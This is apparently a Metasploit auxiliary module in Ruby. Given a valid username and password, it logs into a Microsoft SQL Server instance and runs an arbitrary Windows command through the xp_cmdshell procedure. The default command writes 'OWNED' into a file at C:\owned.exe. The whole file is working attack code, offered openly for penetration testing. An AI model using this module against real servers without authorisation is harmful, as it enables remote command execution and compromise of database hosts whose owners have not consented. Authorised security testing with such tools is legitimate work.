##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server xp_cmdshell Command Execution',
      'Description'    => %q{
        This module will execute a Windows command on a MSSQL/MSDE instance
      via the xp_cmdshell procedure. A valid username and password is required
      to use this module
      },
      'Author'         => [ 'tebo <tebo[at]attackresearch.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://msdn.microsoft.com/en-us/library/cc448435(PROT.10).aspx'],
        ]
    ))

    register_options( [
      OptString.new('CMD', [ false, 'Command to execute',  'cmd.exe /c echo OWNED > C:\\owned.exe']),
    ])
  end

  def run
    mssql_xpcmdshell(datastore['CMD'], true) if mssql_login_datastore
  end
end
